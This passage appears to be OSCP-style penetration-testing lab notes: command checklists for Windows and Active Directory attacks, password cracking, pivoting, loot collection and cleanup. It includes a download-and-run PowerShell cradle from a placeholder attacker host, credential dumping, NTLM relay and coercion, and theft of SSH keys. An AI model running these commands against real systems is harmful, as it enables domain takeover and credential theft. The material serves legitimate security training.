- [ ] **AV / AppLocker / language mode, then one automated sweep** — know what will eat your payload.
```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled,AntivirusEnabled
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode
.\winPEASx64.exe quiet
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/PowerUp.ps1'); Invoke-AllChecks"
```

## 6. Active Directory

Sync the clock before every Kerberos step: `KRB_AP_ERR_SKEW` is a time problem, not a credential problem.

```bash
sudo ntpdate "$DC"          # or: sudo rdate -n "$DC"; the VPN may drop, reconnect
```

- [ ] **Unauthenticated enumeration** — null/guest SMB, RPC, RID brute, kerbrute.
```bash
nxc smb "$DC" -u '' -p '' --shares
nxc smb "$DC" -u guest -p '' --shares --rid-brute
rpcclient -U "" -N "$DC" -c "enumdomusers;enumdomgroups;querydispinfo"
kerbrute userenum -d "$DOMAIN" --dc "$DC" "$USERS" -o valid_users.txt
sort -u valid_users.txt -o valid_users.txt
```

- [ ] **Credential validation and spraying** — policy first, one password per pass, `--continue-on-success`.
```bash
nxc smb "$DC" -u '' -p '' --pass-pol
nxc smb "$DC" -u valid_users.txt -p "$PASS" --continue-on-success
nxc ldap "$DC" -u "$USER" -p "$PASS" --continue-on-success
nxc winrm "$IP" -u "$USER" -p "$PASS"
```

- [ ] **BloodHound** — collect once you hold any account, then read the edges.
```bash
bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c All --zip
# CE builds: bloodhound-ce-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c All --zip
# Kerberos/ccache: bloodhound-python -k --use-kcache -d "$DOMAIN" -ns "$DC" -c All --zip
```

- [ ] **Kerberoast and AS-REP** — RC4 first; AES needs the right mode.
```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile tgs.txt
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request-user <svc> -outputfile tgs.txt
impacket-GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -no-pass -dc-ip "$DC" -format hashcat -outputfile asrep.txt
hashcat -m 13100 tgs.txt "$WORDLIST"; hashcat -m 18200 asrep.txt "$WORDLIST"
```

- [ ] **Kerberos ticket handling** — ccache and kirbi interchange; the file you get from `getST` must be exported before use.
```bash
impacket-getTGT "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=$USER.ccache
impacket-getST -spn cifs/<target> -impersonate administrator "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
klist
```

- [ ] **ACL abuse** — identify with BloodHound, then use the matching primitive.
```bash
impacket-owneredit -action write -new-owner "$USER" -target <group> "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
impacket-dacledit -action write -rights WriteMembers -principal "$USER" -target <group> "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
net rpc group addmem "<group>" "$USER" -U "$DOMAIN/$USER%$PASS" -S "$DC"
net rpc password "<target-user>" 'NewPass123!' -U "$DOMAIN/$USER%$PASS" -S "$DC"
bloodyAD --host "$DC" -d "$DOMAIN" -u "$USER" -p "$PASS" add groupMember "<group>" "$USER"
bloodyAD --host "$DC" -d "$DOMAIN" -u "$USER" -p "$PASS" set owner "<target>" "$USER"
impacket-dacledit -action write -rights DCSync -principal "$USER" -target-dn "DC=<domain>,DC=<tld>" "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
targetedKerberoast.py -d "$DOMAIN" -u "$USER" -p "$PASS" -v
```

- [ ] **Shadow credentials** — needs write on the target object.
```bash
certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account <target> -dc-ip "$DC"
pywhisker.py -d "$DOMAIN" -u "$USER" -p "$PASS" --target <target> --action add
```

- [ ] **Delegation (unconstrained / constrained / RBCD)** — write on the target is enough for RBCD.
```bash
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
impacket-getST -spn cifs/<target-fqdn> -impersonate administrator "$DOMAIN/<svc>:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache; impacket-secretsdump -k -no-pass <target-fqdn>
impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'ATTACK$' -computer-pass 'Pass123!' -dc-ip "$DC"
impacket-rbcd -delegate-from 'ATTACK$' -delegate-to '<TARGET$>' -action write -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
impacket-getST -spn cifs/<target-fqdn> -impersonate administrator -dc-ip "$DC" "$DOMAIN/ATTACK$:Pass123!"
```

- [ ] **ADCS** — run `find` as every new user; findings are permission-dependent. 2026 extends to ESC17 (Server Auth SAN) and the CA-level Certighost (CVE-2026-54121).
```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca <CA-NAME> -template <TEMPLATE> -upn "administrator@$DOMAIN" -dc-ip "$DC"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template <TEMPLATE> -write-default-configuration -save-old -dc-ip "$DC"
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template <TEMPLATE> -configuration <TEMPLATE>.json -dc-ip "$DC"
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca <CA-NAME> -template WebServer -upn "administrator@$DOMAIN" -application-policies 'Client Authentication' -dc-ip "$DC"   # ESC15
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca <CA-NAME> -template DomainController -dc-ip "$DC"                                                             # Certighost (CVE-2026-54121), unpatched CA
```

- [ ] **MSSQL as a pivot** — auth backend matters: `--local-auth` vs domain, `-windows-auth`.
```bash
impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth
```
```powershell
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC master..xp_dirtree '\\<ATTACKER>\share\a';
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\proof.txt', SINGLE_CLOB) AS C;
```

- [ ] **Relay and coercion** — check signing first; start the relay before the coercion.
```bash
nxc smb <cidr> --gen-relay-list relay.txt
sudo responder -I tun0 -wv
impacket-ntlmrelayx -tf relay.txt -smb2support
impacket-ntlmrelayx -t "http://<CA-HOST>/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController
impacket-ntlmrelayx -t ldaps://"$DC" -smb2support --delegate-access --remove-mic
python3 PetitPotam.py "$ATTACKER" "$DC"
impacket-printerbug "$DOMAIN/$USER:$PASS@$DC" "$ATTACKER"
python3 dfscoerce.py -u "$USER" -p "$PASS" "$ATTACKER" "$DC"
```

- [ ] **DCSync / domain dominance** — one clean dump, then stop.
```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC" -just-dc -outputfile dcsync
impacket-secretsdump -k -no-pass "$DC" -just-dc
nxc smb "$DC" -u "$USER" -p "$PASS" --ntds
```

- [ ] **Trusts** — direction, transitivity and SID filtering decide whether ExtraSids works.
```bash
nltest /domain_trusts /all_trusts /v          # on a domain-joined host
impacket-GetUserSPNs "<other-domain>/<user>:<pass>" -dc-ip "<other-dc>" -request -outputfile cross.txt
```

- [ ] **2025–2026 high-value CVEs to check first** — each is a single-credential path to SYSTEM/DA on unpatched environments.
```bash
# NoPac (CVE-2021-42278/42287) — any standard user, MachineAccountQuota > 0
nxc smb "$DC" -u "$USER" -p "$PASS" -M nopac

# PrintNightmare (CVE-2021-1675/34527) — spooler running
rpcdump.py @"$IP" 2>/dev/null | egrep 'MS-RPRN|MS-PAR'

# ResetNightmare (CVE-2026-27912) — any user resets any password via kpasswd
# ResetNightmare.ps1 + Rubeus; check patch level: pre-March 2026 is vulnerable

# Certighost (CVE-2026-54121) — standard user → DC certificate → DCSync
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -i certighost

# NTLM reflection (CVE-2025-33073) — any user → SYSTEM on hosts without signing
nmap -p445 --script smb2-security-mode "$IP"   # "signing enabled but not required" → exploitable
```

## 7. Cracking & credential handling

Identify the format before choosing a mode; a wrong mode is `No hashes loaded`, not a slow crack.

| Hash | Example prefix | hashcat | john |
| ---- | -------------- | ------- | ---- |
| NTLM | 32 hex, from SAM/NTDS | `-m 1000` | `--format=NT` |
| NetNTLMv1 | `USER::HOST:...` | `-m 5500` | `--format=netntlm` |
| NetNTLMv2 | `USER::DOMAIN:...` | `-m 5600` | `--format=netntlmv2` |
| md5crypt | `$1$` | `-m 500` | `--format=md5crypt` |
| sha256crypt | `$5$` | `-m 7400` | `--format=sha256crypt` |
| sha512crypt | `$6$` | `-m 1800` | `--format=sha512crypt` |
| bcrypt | `$2a$` / `$2b$` / `$2y$` | `-m 3200` | `--format=bcrypt` |
| Kerberoast RC4 | `$krb5tgs$23$` | `-m 13100` | `--format=krb5tgs` |
| Kerberoast AES128 / AES256 | `$krb5tgs$17$` / `$18$` | `-m 19600` / `19700` | `--format=krb5tgs` |
| AS-REP RC4 | `$krb5asrep$23$` | `-m 18200` | `--format=krb5asrep` |
| MSSQL 2012+ | `0x0100...` | `-m 1731` | — |
| MySQL native | `*` + 40 hex | `-m 300` | — |
| MySQL caching_sha2 | `$A$` | `-m 7401` | — |
| KeePass | `.kdbx` → `keepass2john` | `-m 13400` | `--format=keepass` |
| BitLocker | recovery-key blob | `-m 22100` | — |
| JWT (HS256) | `eyJ...` | `-m 16500` | — |
| APOP | `<user>:<timestamp>:<md5>` | `-m 20` | — |

AES Kerberoast mode numbers move between hashcat releases — confirm with `hashcat --example-hashes | grep -i krb` before trusting them.

- [ ] **Baseline crack** — wordlist, then rules, then masks; stop at the timebox, not at 100%.
```bash
hashcat -m <mode> hashes.txt "$WORDLIST" -O -w 3
hashcat -m <mode> hashes.txt "$WORDLIST" -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
hashcat -m <mode> hashes.txt --show
```

- [ ] **Slow modes** — cap the time; one bcrypt hash must not eat the box.
```bash
hashcat -m 3200 hashes.txt "$WORDLIST" --user
john --format=bcrypt --wordlist="$WORDLIST" hashes.txt
```

- [ ] **John for files and formats** — `*2john` converts, then the same wordlist.
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.hashes && john --wordlist="$WORDLIST" unshadowed.hashes
ssh2john id_rsa > id_rsa.hash && john --wordlist="$WORDLIST" id_rsa.hash
zip2john loot.zip > zip.hash && john --wordlist="$WORDLIST" zip.hash
keepass2john vault.kdbx > keepass.hash && john --wordlist="$WORDLIST" keepass.hash
john --rules --wordlist="$WORDLIST" hashes.txt
```

- [ ] **Wordlist mutation** — build from the target's own words when rockyou is not enough.
```bash
cewl "http://$DOMAIN" -d 4 -m 6 --lowercase -w cewl.txt
hashcat --force cewl.txt -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.txt
```

- [ ] **Spraying** — one password per pass, respect the lockout counter.
```bash
nxc smb "$DC" -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d "$DOMAIN" --dc "$DC" users.txt 'Spring2026!'
hydra -L users.txt -P passwords.txt -u -f ssh://"$IP" -t 4
crowbar -b rdp -s "$IP"/32 -U users.txt -c 'Spring2026!'
```

- [ ] **Not hashes** — do not send these to hashcat.
```bash
gpp-decrypt '<cpassword>'          # GPP: the AES key is public
python3 cisco_de7.py <type7-blob>  # Cisco type 7: reversible XOR
```

## 8. Pivoting & tunneling

- [ ] **SSH tunnels** — `-L` local, `-R` reverse, `-D` SOCKS; the most stable option when SSH exists.
```bash
ssh -L 8080:127.0.0.1:80 "$USER@$IP" -N -f
ssh -L 8080:127.0.0.1:80 -L 3306:127.0.0.1:3306 "$USER@$IP" -N
ssh -R 8080:127.0.0.1:80 "$USER@$IP" -N -f   # target:8080 -> your 127.0.0.1:80
ssh -D 1080 "$USER@$IP" -N -f
```

- [ ] **Chisel** — one binary, works from Windows and Linux.
```bash
# Linux
./chisel server -p 8000 --reverse
# target
./chisel client "$ATTACKER":8000 R:socks
./chisel client "$ATTACKER":8000 R:8888:127.0.0.1:8888
```

- [ ] **ligolo-ng** — full network stack; needs a TUN interface on the attacker host.
```bash
sudo ip tuntap add user "$(whoami)" mode tun ligolo && sudo ip link set ligolo up
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601   # older builds: ./proxy
# target
./ligolo-agent -connect "$ATTACKER":11601 -ignore-cert   # older builds: ./agent
# proxy console
session
ifconfig
autoroute
start
```

- [ ] **proxychains** — TCP only; scanners need `-sT -Pn`, and UDP will not work.
```bash
# /etc/proxychains4.conf -> [ProxyList] -> socks5 127.0.0.1 1080
proxychains4 -q nmap -sT -Pn -p80,445,3389 "$IP"
proxychains4 -q nxc smb "$IP" -u "$USER" -p "$PASS"
proxychains4 -q evil-winrm -i "$IP" -u "$USER" -p "$PASS"
```

- [ ] **socat** — a one-off forward or a relay on the pivot host.
```bash
socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80
socat TCP4-LISTEN:4444,fork TCP4:"$ATTACKER":4444
```

- [ ] **Windows netsh** — native portproxy, admin required.
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1
netsh advfirewall firewall add rule name="p8080" protocol=TCP dir=in localport=8080 action=allow
netsh interface portproxy show all
netsh interface portproxy del v4tov4 listenport=8080 listenaddress=0.0.0.0
```

- [ ] **Metasploit autoroute + SOCKS** — when you already have a session.
```bash
msfconsole -q -x "use post/multi/manage/autoroute; set SESSION <id>; run"
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 5; run"
```

## 9. Loot, exfil & reporting

- [ ] **Collect flags and keys** — both, with context in the same shot.
```bash
cat /root/proof.txt /home/*/local.txt 2>/dev/null
cat /root/.ssh/id_rsa /home/*/.ssh/id_rsa 2>/dev/null
```
```powershell
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\<user>\Desktop\local.txt
dir C:\Users\<user>\.ssh
```

- [ ] **Pull loot back** — SMB for volume, HTTP upload for one file, base64 for small blobs.
```bash
impacket-smbserver loot /tmp/loot -smb2support
python3 -m uploadserver 8000
curl -s -o loot.zip "http://$IP/loot.zip"
```

- [ ] **Evidence and hashes** — every finding gets a file, a timestamp and a checksum.
```bash
date -u +"%Y-%m-%dT%H:%M:%SZ" | tee -a "engagement/hosts/$IP.md"
import -window root "engagement/evidence/F-01_$(date +%Y%m%d_%H%M)_root.png"
sha256sum loot/* >> engagement/evidence/hashes.txt
```

- [ ] **Cleanup** — revert what you changed, remove what you added, verify the revert.
```bash
rm -f /tmp/rootbash /tmp/rev.sh /tmp/linpeas.sh /tmp/x.so
find /tmp /dev/shm -maxdepth 1 -type f -newermt '-1 day' 2>/dev/null
```
```powershell
net user <added-user> /delete 2>$null
sc.exe config <svc> binpath= "<original-path>"
Remove-Item C:\Temp\nc.exe,C:\Temp\lsass.dmp -ErrorAction SilentlyContinue
```

- [ ] **Post-engagement forensic notes** — record what a defender would need to reconstruct the timeline (timestamp of every write, every credential used, every revert).
```bash
find / -mmin -180 -type f 2>/dev/null | head -50 > engagement/post-activity.txt
```

## Quick decision table

| Symptom | Next command | Page |
| ------- | ------------ | ---- |
| Top-1000 scan empty or all filtered | `nmap -sS -p- --min-rate 5000` plus UDP 161 | [Information Gathering](/notes/web-applications/information-gathering/) |
| 403 on a directory | Treat as existing: `/.git/`, `.bak`, `OPTIONS`, trailing slash | [Fuzzing](/notes/web-applications/fuzzing/) |
| IP root looks like a decoy | `ffuf -H "Host: FUZZ.$DOMAIN" -ac`; read the TLS SAN | [Fuzzing](/notes/web-applications/fuzzing/) |
| `.git` or a backup exposed | `git-dumper`, `git log -p`, `git diff --cached`, grep configs | [Linux machines](/notes/oscp-labs/linux/) |
| Login form, unknown product | Product defaults → `nxc` spray → type juggling / `' or 1=1-- -` | [Password Attacks](/notes/utilities-scripts-and-payloads/password-attacks/) |
| Upload accepted but not executed | `.php.png`, `.htaccess`/`web.config`, magic bytes, `phar://` | [File Uploads](/notes/web-applications/web-attacks/file-uploads/) |
| `?page=` / `?file=` parameter | Traversal → wrappers → log/session poisoning | [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) |
| Numeric parameter, DB errors | Manual quote/comment/time test, then `sqlmap -r` | [SQLi](/notes/web-applications/web-attacks/sql-injection/) |
| Server-side URL fetcher | `127.0.0.1:<port>`, `169.254.169.254`, `file://` | [SSRF](/notes/web-applications/web-attacks/ssrf/) |
| Input reflected in a template | `${7*7}` / `{{7*7}}` / `<%=7*7%>`, then engine gadget | [Command Injection](/notes/web-applications/web-attacks/os-command-injection/) |
| Cookie with three dot-parts | Decode, `jwt_tool -M at`, crack `-m 16500` | [JWTs](/notes/web-applications/web-attacks/json-web-tokens-jwts/) |
| SMB 445 only, no creds | Null/guest shares, `rpcclient enumdomusers`, `--rid-brute` | [SMB](/notes/protocols-and-services/smb/) |
| 88/389/3268 open | `kerbrute userenum`, then BloodHound with any account | [AD initial access](/notes/active-directory/initial-access/) |
| Password from a config or share | Spray SMB/LDAP/WinRM/SSH/MSSQL, then `su`/SSH on the host | [Password Attacks](/notes/utilities-scripts-and-payloads/password-attacks/) |
| `sudo -l` shows a binary | GTFOBins for that binary; check wildcards and `env_keep` | [Linux privesc](/notes/linux-privilege-escalation/enumerating-attack-vectors/) |
| `sudo -l` shows `NOPASSWD` on a script | Read the script — relative command, PATH, `env_keep`, or the 2025 `--chroot` chain | [Linux privesc](/notes/linux-privilege-escalation/enumerating-attack-vectors/) |
| `whoami /priv` shows SeImpersonate | GodPotato / PrintSpoofer, then `whoami` as SYSTEM | [Token abuse](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) |
| Writable service binary or path | Replace, restart, expect 1053 or a failed start | [Services](/notes/windows-privilege-escalation/unquoted-service-paths/) |
| Service bound to 127.0.0.1 | `ssh -L`, chisel or ligolo, then re-enumerate | [Pivoting](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) |
| `KRB_AP_ERR_SKEW` | `sudo ntpdate "$DC"`, reconnect VPN, retry | [Kerberos delegation](/notes/active-directory/kerberos-delegation/) |
| `certipy find` shows ESC1/ESC4/ESC8/ESC15/ESC17 | Request with `-upn` or `-application-policies`; restore the template; relay to HTTP enrollment | [ADCS](/notes/active-directory/adcs-attacks/) |
| BloodHound path ends in DCSync rights | `secretsdump -just-dc`, one dump, then proof | [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) |
| Two domains or a trust | Check direction and SID filtering, then cross-forest Kerberoast | [Domain trusts](/notes/active-directory/domain-trusts/) |
| Hash will not load in hashcat | Match the mode to the prefix; `hashcat --example-hashes` | [Password Attacks](/notes/utilities-scripts-and-payloads/password-attacks/) |
| Payload runs but no shell | Verify out-of-band (`tcpdump -ni tun0 icmp`), change payload class | [Shells](/notes/utilities-scripts-and-payloads/shells-and-payloads/) |
| Box resists past its timebox | Park it, write the failed path, rotate, return with fresh eyes | [Methodology](/notes/oscp-labs/methodology/#decision-gates-and-timeboxes) |

## One-page pre-flight — Linux host

```bash
# 01 — identity and privilege snapshot
id; whoami; hostname; uname -a; cat /etc/os-release; sudo -V | head -1
# 02 — sudo is the highest-value read
sudo -l
# 03 — SUID/SGID/caps inventory
find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null; getcap -r / 2>/dev/null
# 04 — cron, timers, psyp
cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d 2>/dev/null; systemctl list-timers --all
# 05 — group membership (docker, lxd, disk, adm, shadow)
id
# 06 — env, PATH, ld.so.preload
env; echo "$PATH"; ls -la /etc/ld.so.preload 2>/dev/null
# 07 — local credentials
grep -riE 'pass|pwd|secret|token' ~/.bash_history /var/www /opt /srv 2>/dev/null | head
# 08 — process environ and cmdline
for p in /proc/[0-9]*; do tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE 'pass|token|secret' && echo " ^PID $p"; done
# 09 — network posture
ss -tulpn; ip route; cat /etc/resolv.conf
# 10 — container or VM?
ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup | head -3; capsh --print 2>/dev/null | grep -E 'cap_sys_admin|cap_dac_read'
```

## One-page pre-flight — Windows host

```powershell
# 01 — identity and integrity
whoami /all; whoami /priv; whoami /groups | findstr "Mandatory"
# 02 — local admin and session context
net localgroup administrators
query user
# 03 — patch level and OS
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
# 04 — AV, AppLocker, language mode
Get-MpComputerStatus | select RealTimeProtectionEnabled,AntivirusEnabled
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode
# 05 — services, unquoted paths, writable binaries
Get-CimInstance win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# 06 — stored credentials
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
# 07 — AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 08 — PSReadLine history, cmdkey, runas /savecred
gc (Get-PSReadLineOption).HistorySavePath
# 09 — LSASS protection status (RunAsPPL, Credential Guard)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | select SecurityServicesRunning
# 10 — one automated sweep with manual verification
.\winPEASx64.exe quiet
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/PowerUp.ps1'); Invoke-AllChecks"
```

## One-page pre-flight — AD (any one domain user)

```bash
# 01 — clock first, or Kerberos fails
sudo ntpdate "$DC"
# 02 — validate the credential on each service
nxc smb "$DC" -u "$USER" -p "$PASS"
nxc ldap "$DC" -u "$USER" -p "$PASS" --users --groups
nxc winrm "$IP" -u "$USER" -p "$PASS"
# 03 — BloodHound
bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c All --zip
# 04 — SPN roast and AS-REP roast
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile tgs.txt
impacket-GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -no-pass -dc-ip "$DC" -format hashcat -outputfile asrep.txt
# 05 — ACL paths, delegation, and ADCS — permission-dependent, so re-check as each new user
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 06 — open relay surface
nxc smb <cidr> --gen-relay-list relay.txt
nmap -p445 --script smb2-security-mode "$IP"
# 07 — coercion primitives to try
python3 PetitPotam.py "$ATTACKER" "$DC"
impacket-printerbug "$DOMAIN/$USER:$PASS@$DC" "$ATTACKER"
# 08 — high-value 2025–2026 CVEs to check the patch level for
nxc smb "$DC" -u "$USER" -p "$PASS" -M nopac           # NoPac
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -iE 'ESC1|ESC15|ESC17|Certighost'
```

Next: turn the results into a hypothesis and use the [methodology](/notes/oscp-labs/methodology/) decision table. Worked examples of every technique on this page are in [Linux machines](/notes/oscp-labs/linux/), [Windows machines](/notes/oscp-labs/windows/) and [Active Directory machines](/notes/oscp-labs/ad/).
